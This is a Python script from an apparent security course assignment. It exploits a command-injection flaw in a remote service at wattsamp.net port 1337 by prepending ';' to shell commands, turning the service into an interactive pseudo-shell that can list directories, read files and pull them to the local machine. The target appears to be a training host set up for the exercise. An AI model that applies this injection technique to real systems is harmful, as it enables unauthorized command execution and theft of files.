"""
    Use the same techniques such as (but not limited to):
        1) Sockets
        2) File I/O
        3) raw_input()

    from the OSINT HW to complete this assignment. Good luck!
"""

import socket
import time
import sys

host = "wattsamp.net" # IP address here
port = 1337 # Port here
pwd = ""

help_text = "shell        start shell\npull         <remote-path> <local-path> download files\ncd           change directory\nls           show contents of current directory\ncat          writes contents of file to stdout\nhelp         shows this menu\nquit         Quit the shell\nHint: try using ';' to concatenate commands!"

ctrl_cmds = ["help", "quit"]

def execute_cmd(cmd, arg1, arg2):
    global pwd
    # Establish socket connection
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.setblocking(True)

    data = s.recv(1024).decode()     # Receives 1024 bytes from IP/Port

    cmd_inject = ""

    if cmd == "shell" or cmd == "pwd":
        cmd_inject = "; pwd"
    elif cmd == "ls":
        cmd_inject = "; cd " + pwd + "; ls"
    elif cmd == "cd":
        cmd_inject = "; cd " + pwd + "; cd " + arg1 + "; pwd"
    elif cmd == "pull" or cmd == "cat":
        cmd_inject = "; cd " + pwd + "; cat " + arg1
    else:
        print("Unknown command " + cmd + "\n" + help_text)
        return

    s.send((cmd_inject + "\n").encode())
    data = s.recv(1024).decode()     # Receives 1024 bytes from IP/Port

    if cmd == "shell" or cmd == "cd":
        pwd = data.strip()
    elif cmd == "pwd" or cmd == "ls" or cmd == "cat":
        print(data.strip())
    elif cmd == "pull":
        w = open(arg2, "w+")
        w.write(data)
        print("Wrote " + str(len(data)) + " bytes from " + arg1 + " to " + arg2)


if __name__ == '__main__':
    while True:
        raw = input(pwd + (" $ " if pwd != "" else ">"))
        split_by_semicolon = raw.split(";")
        for raw_cmd in split_by_semicolon:
            parsed = raw_cmd.split()
            cmd = parsed[0]

            arg1 = ""
            arg2 = ""
            if len(parsed) > 1:
                arg1 = parsed[1]
            if len(parsed) > 2:
                arg2 = parsed[2]

            if cmd in ctrl_cmds:
                if cmd == "help":
                    print(help_text)
                if cmd == "quit":
                    sys.exit()

            elif cmd == "shell" or pwd != "":
                execute_cmd(cmd, arg1, arg2)
            else:
                print("Must start shell first! Use command 'shell' to begin\n")

